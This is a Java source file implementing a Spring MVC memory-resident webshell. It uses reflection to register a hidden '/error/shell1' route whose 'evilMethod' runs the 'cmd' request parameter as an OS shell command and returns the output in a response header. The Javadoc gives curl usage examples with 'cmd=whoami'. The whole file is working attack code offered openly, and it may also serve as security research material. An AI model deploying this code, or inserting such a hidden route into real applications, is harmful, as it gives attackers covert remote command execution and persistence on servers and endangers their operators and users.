package com.example.springshell.memshell;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.*;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 *  No error inject:
 <ol>
 <li>curl http://127.0.0.1:8080/exec?injectPath=/error/ikun</li>
 <li>curl http://127.0.0.1:8080/error/ikun?cmd=whoami</li>
 </ol>
 * @Version v5.3.0-M1 -> v6.1.1
 * @author jeyiuwai
 */

public class No1_HandlerMethodShell {
    public static String injectShell() throws InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        HttpServletRequest request =  ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            // get mappingHandlerMapping
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = (RequestMappingHandlerMapping) context.getBean("requestMappingHandlerMapping");

            //            public RequestMappingInfo(@Nullable String name, @Nullable PatternsRequestCondition patterns,
            //                    @Nullable RequestMethodsRequestCondition methods, @Nullable ParamsRequestCondition params,
            //                    @Nullable HeadersRequestCondition headers, @Nullable ConsumesRequestCondition consumes,
            //                    @Nullable ProducesRequestCondition produces, @Nullable RequestCondition<?> custom)

            // 1.1 - mapping - wrong
//        PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition("/ikun");
//        RequestMethodsRequestCondition requestMethodsRequestCondition = new RequestMethodsRequestCondition(RequestMethod.GET);
//
//        RequestMappingInfo mapping = new RequestMappingInfo(patternsRequestCondition,requestMethodsRequestCondition,null,null,null,null,null);

            // 1.1 - mapping - correct
            //        	private RequestMappingInfo(@Nullable String name,
            //                @Nullable PathPatternsRequestCondition pathPatternsCondition,
            //                @Nullable PatternsRequestCondition patternsCondition,
            //                RequestMethodsRequestCondition methodsCondition, ParamsRequestCondition paramsCondition,
            //                HeadersRequestCondition headersCondition, ConsumesRequestCondition consumesCondition,
            //                ProducesRequestCondition producesCondition, RequestConditionHolder customCondition,
            //                RequestMappingInfo.BuilderConfiguration options)

            Constructor<?> requestMappingInfoConstructor = null;
            try {
                Class<?> requestMappingInfoClass = Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
                requestMappingInfoConstructor = requestMappingInfoClass.getDeclaredConstructor(String.class, PathPatternsRequestCondition.class, PatternsRequestCondition.class,
                        RequestMethodsRequestCondition.class, ParamsRequestCondition.class,
                        HeadersRequestCondition.class, ConsumesRequestCondition.class,
                        ProducesRequestCondition.class, RequestConditionHolder.class,
                        RequestMappingInfo.BuilderConfiguration.class);
                requestMappingInfoConstructor.setAccessible(true);
            } catch (Exception e) {
                System.out.println("here1");
                e.printStackTrace();
            }

            // 注入 Webshell 的路径
//            String injectPath= request.getParameter("injectPath");
            String injectPath= "/error/shell1";
            PathPatternsRequestCondition pathPatternsRequestCondition = new PathPatternsRequestCondition(new PathPatternParser(), injectPath);

            RequestMappingInfo mapping = (RequestMappingInfo) requestMappingInfoConstructor
                    .newInstance(null,
                            pathPatternsRequestCondition,
                            null,
                            new RequestMethodsRequestCondition(RequestMethod.GET),
                            new ParamsRequestCondition(),
                            new HeadersRequestCondition(),
                            new ConsumesRequestCondition(),
                            new ProducesRequestCondition(),
                            new RequestConditionHolder(null),
                            new RequestMappingInfo.BuilderConfiguration()
                    );

            // 1.2 - handler
            No1_HandlerMethodShell handler = new No1_HandlerMethodShell();

            // 1.3 - method
            try {
                Method method = No1_HandlerMethodShell.class.getMethod("evilMethod");
                // *2* - register Mapping
                mappingHandlerMapping.registerMapping(mapping, handler, method);
//                response.getWriter().println("inject success!");
                return "{\"result\":\"No1_HandlerMethodShell_success\"}";
            } catch (NoSuchMethodException e) {
//                throw new RuntimeException(e);
            }
        }catch (IllegalStateException e) {
            // 处理重复注入的报错
//            e.printStackTrace();
//            response.getWriter().println("injected already!");
            return "{\"result\":\"No1_HandlerMethodShell_already\"}";
        }
        return "{\"result\":\"No1_HandlerMethodShell\"}";
    }

    public void evilMethod() {
        try {
            HttpServletRequest request =  ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
//                response.getWriter().write(output);
//                response.getWriter().flush();
//                response.getWriter().close();
                response.setHeader("Exec-result", new String(output));
            }

        }catch (Exception e) {
            System.out.println("here3");
        }
    }
}
